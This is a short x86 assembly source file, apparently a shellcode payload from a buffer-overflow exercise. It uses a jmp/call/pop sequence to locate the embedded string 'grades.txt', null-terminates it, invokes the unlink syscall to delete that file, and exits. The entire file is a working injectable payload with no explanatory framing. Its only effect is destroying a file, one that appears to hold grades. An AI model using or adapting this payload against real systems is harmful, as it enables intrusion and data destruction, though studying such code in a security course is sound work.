#include <sys/syscall.h>

#define STRING  "grades.txt"
#define STRLEN  10

.globl main
        .type   main, @function

 main:
        jmp     calladdr

 popladdr:
        popl    %esi
        movl    %esi,(STRLEN+1)(%esi)   /* set up argv pointer to pathname */
        xorl    %eax,%eax               /* get a 32-bit zero value */
        movb    %al,(STRLEN)(%esi)      /* null-terminate our string */

        movl    $10,%eax                /* syscall number: unlink (10) */
        movl    %esi,%ebx               /* syscall arg: string pathname */
        int     $0x80                   /* invoke syscall */

        movl    $1, %eax                /* syscall number: exit (1) */
        xorl    %ebx,%ebx               /* syscall arg: exit status */
        int     $0x80                   /* invoke syscall */

 calladdr:
        call    popladdr
        .ascii  STRING
